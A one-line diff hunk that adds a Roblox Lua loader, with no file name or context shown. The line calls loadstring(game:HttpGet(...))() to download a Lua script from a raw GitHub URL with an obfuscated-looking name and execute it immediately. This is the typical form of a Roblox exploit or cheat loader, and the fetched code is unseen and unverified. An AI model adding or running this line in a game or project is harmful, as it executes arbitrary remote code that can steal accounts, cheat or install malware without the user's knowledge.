@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/maintenance-azure-latch-spam5-g32ddqskoe0hhh.lua"))()
